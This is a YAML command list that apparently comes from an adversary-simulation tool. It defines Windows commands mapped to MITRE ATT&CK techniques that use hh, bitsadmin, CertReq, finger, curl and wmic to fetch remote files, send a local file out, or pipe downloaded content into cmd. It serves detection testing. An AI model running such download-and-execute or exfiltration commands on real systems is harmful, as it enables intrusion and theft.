
---
commands:
   ingress_tools_hh:
      remote: false
      id: ingress_tools_hh
      command: 'hh https://github.com/joeavanzato/ThreatSim/TODO.ps1'
      stealth: low
      mitre:
         - 'Execution;T1059.003;Command and Scripting Interpreter: Windows Command Shell'
         - 'Command and Control;T1105;Ingress Tool Transfer'
      comments: 'Download a file with hh.'
   ingress_tools_bitsadmin_1:
      remote: false
      id: ingress_tools_bitsadmin_1
      command: 'bitsadmin /create 1 bitsadmin /addfile 1 https://github.com/joeavanzato/ThreatSim/TODO.exe c:\threatsim\threatsim.exe bitsadmin /RESUME 1 bitsadmin /complete 1'
      stealth: low
      mitre:
         - 'Execution;T1059.003;Command and Scripting Interpreter: Windows Command Shell'
         - 'Command and Control;T1105;Ingress Tool Transfer'
      comments: 'Download a file with bitsadmin.'
   ingress_tools_certreq:
      remote: false
      id: ingress_tools_certreq
      command: 'CertReq -Post -config https://threatsim-c2-test.org c:\windows\win.ini C:\threatsim\threatsim.txt'
      stealth: low
      mitre:
         - 'Execution;T1059.003;Command and Scripting Interpreter: Windows Command Shell'
         - 'Command and Control;T1105;Ingress Tool Transfer'
      comments: 'Download results of POST to given endpoint as threatsim.txt with certreq.'
   ingress_tools_finger:
      remote: false
      id: ingress_tools_finger
      command: 'finger threatsim@threatsimexample.com | more +2 | cmd'
      stealth: low
      mitre:
         - 'Execution;T1059.003;Command and Scripting Interpreter: Windows Command Shell'
         - 'Command and Control;T1105;Ingress Tool Transfer'
      comments: 'Download results of probing threatsimexample.com with a finger request for user threatsim - possible shellcode to cmd.'
   ingress_tools_curl:
      remote: false
      id: ingress_tools_curl
      command: 'curl http://threatsimtest.biz -o C:\threatsim\threatsim.txt'
      stealth: low
      mitre:
         - 'Execution;T1059.003;Command and Scripting Interpreter: Windows Command Shell'
         - 'Command and Control;T1105;Ingress Tool Transfer'
      comments: 'Download results of curl to output file'
   ingress_tools_wmic_process_get:
      remote: false
      id: ingress_tools_wmic_process_get
      command: 'cmd /c wmic process get brief /format:"https://raw.githubusercontent.com/joeavanzato/threatsim/master/deliveries/wmic_popper.xsl"'
      stealth: low
      mitre:
         - 'Execution;T1059.003;Command and Scripting Interpreter: Windows Command Shell'
         - 'Execution;T1047;Windows Management Instrumentation'
         - 'Command and Control;T1105;Ingress Tool Transfer'
      comments: 'Download results of curl to output file'